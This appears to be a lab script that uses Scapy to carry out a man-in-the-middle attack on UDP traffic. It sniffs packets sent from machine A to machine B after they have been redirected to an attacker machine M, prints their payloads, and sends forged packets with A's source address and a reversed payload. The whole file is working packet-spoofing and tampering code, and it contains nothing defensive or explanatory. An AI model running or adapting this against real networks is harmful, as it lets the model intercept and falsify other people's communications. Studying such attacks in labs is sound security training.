from scapy.all import *

def spoof(pkt):
    if (
        pkt[IP].src == "192.168.0.110" # machine A
        and pkt[IP].dst == "192.168.0.108" # machine B
        and pkt[Ether].dst == "f4:0f:24:1a:13:f1" # machine M
    ):
        data = pkt[Raw].load
        print(f'>>>>>> {data}, length: {len(data)}')
        ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
        udp = UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport)
        newdata = str(data)[::-1]
        newpkt = ip / udp / newdata

        print("Spoofed Packet Sent as : ", newdata)
        send(newpkt)


pkt = sniff(filter="udp", prn=spoof)
